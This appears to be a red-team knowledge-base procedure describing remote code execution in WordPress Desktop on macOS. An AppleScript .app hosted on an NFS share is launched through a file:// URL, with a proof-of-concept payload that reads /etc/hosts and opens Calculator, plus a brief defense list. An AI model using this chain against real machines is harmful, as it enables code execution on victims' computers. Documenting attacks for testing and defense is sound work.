---
id: proc-uuid-002
tags:
  - nfs
  - applescript
  - macos
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/cat-etc-hosts]]'
  - '[[commands/open-calculator]]'
verified: false
platforms:
  - macOS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:23:28.107Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Windows Command Shell]]'
---
# Host-Malicious-AppleScript-App-on-NFS-Mount

## Summary

This procedure sets up an NFS share hosting a malicious AppleScript .app file that executes shell commands, enabling RCE when opened via the exploited file:// URL in WordPress Desktop.

## Description

The attacker creates an AppleScript application bundle (.app) containing scripts to run commands like file reads or app launches. This is mounted on an NFS server accessible via a predictable network path (e.g., /net/IP/path). When shell.openExternal processes the file:// URL, it launches the .app natively on macOS. Prerequisites: NFS server setup and AppleScript development tools. Expected outcome: Remote execution of embedded commands on victim machine.

## Requirements

1. NFS server configured and accessible from victim's network
2. macOS environment to build the .app
3. Script Editor or osacompile for AppleScript compilation

## Defense

Defensive measures and detection strategies:

- Block or monitor NFS mounts from untrusted networks
- Restrict file:// URL handling in applications
- Use endpoint detection to flag unexpected .app launches

## Objectives

1. Host executable payload accessible via file://
2. Execute arbitrary shell commands on victim
3. Demonstrate RCE capabilities (file read, app execution)

## Instructions

### Step 1: Create AppleScript Payload

**Context**: Build the malicious script that runs commands when the .app opens.

Use Script Editor to create an AppleScript:

```applescript
tell application "Terminal"
    do script "cat /etc/hosts"
    do shell script "open -a Calculator"
end tell
```

> Save as hack2.app. This reads /etc/hosts and opens Calculator.

### Step 2: Set Up NFS Mount

**Context**: Host the .app on NFS for remote access.

Place hack2.app at /var/nfs/general/ on NFS server. Configure exports to allow access from victim's subnet. Test with: file:///net/192.241.239.91/var/nfs/general/hack2.app

> Ensure the path resolves and .app executes when opened.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Windows Command Shell]] Windows Command Shell (macOS shell equivalent)

### Sub-Techniques

- None

## Commands Used

- [[commands/cat-etc-hosts]]
- [[commands/open-calculator]]

## Tools Used

- None

## Tags

- [[nfs]]
- [[AppleScript]]
- [[rce]]
